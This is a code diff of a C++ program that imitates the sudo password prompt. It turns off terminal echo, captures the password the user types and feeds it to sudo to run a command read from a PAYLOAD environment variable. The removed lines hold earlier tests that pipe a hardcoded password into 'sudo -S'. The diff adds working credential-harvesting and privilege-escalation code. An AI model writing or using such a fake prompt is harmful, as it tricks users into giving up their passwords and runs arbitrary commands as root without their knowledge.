@@ -31,6 +31,7 @@ int main(int argc, char *argv[])
 {
 
     std::string username = "";
+    std::string payload = "";
     std::string password_prompt = "[sudo] passsword for";
     std::string obtained_password = "";
 
@@ -45,44 +46,22 @@ int main(int argc, char *argv[])
     else
     {
         username = getenv("USER");
+        payload = getenv("PAYLOAD");
         password_prompt = password_prompt + " " + username + ":";
         std::cout << password_prompt;
+        //hides terminal input
         termios oldt;
         tcgetattr(STDIN_FILENO, &oldt);
         termios newt = oldt;
         newt.c_lflag &= ~ECHO;
         tcsetattr(STDIN_FILENO, TCSANOW, &newt);
         std::cin >> obtained_password;
-        // SetConsoleMode(hStdin, mode);
+        //turns terminal back on
+
         tcsetattr(STDIN_FILENO, TCSANOW, &oldt);
-        std::cout << "\n obtained pass: " << obtained_password;
-        // char *binaryPath = "/usr/bin/sudo";
-        // char *arg1 = "apt ";
-        // char *arg2 = "/home";
-        // execl(binaryPath, binaryPath, arg1, arg2, NULL);
-
-        execute_command(obtained_password, "ls");
-
-        // std::cout << obtained_password;
+        // std::cout << "\n obtained pass: " << obtained_password;
+        execute_command(obtained_password, payload);
     }
-    // char *binaryPath = "/bin/ls";
-    // char *arg1 = "-lh";
-    // char *arg2 = "/home";
-
-    // execl(binaryPath, binaryPath, arg1, arg2, NULL);
-
-    // char *binaryPath = "/usr/bin/sudo";
-    // char *arg1 = "-i";
-    // char *arg2 = "killermario64";
-
-    // execl(binaryPath, binaryPath, arg1, arg2, NULL);
-    // char *binaryPath = "/bin/echo";
-    // char *arg1 = "killermario64";
-    // char *arg2 = "killermario64";
-
-    // execl(binaryPath, binaryPath, arg1, arg2, NULL);
-    // system("echo killermario64 | sudo -S \"/usr/bin/sudo -i\"");
-    // system("echo killermario64 | /usr/bin/sudo -S /home/blake/hello");
 
     return 0;
 }
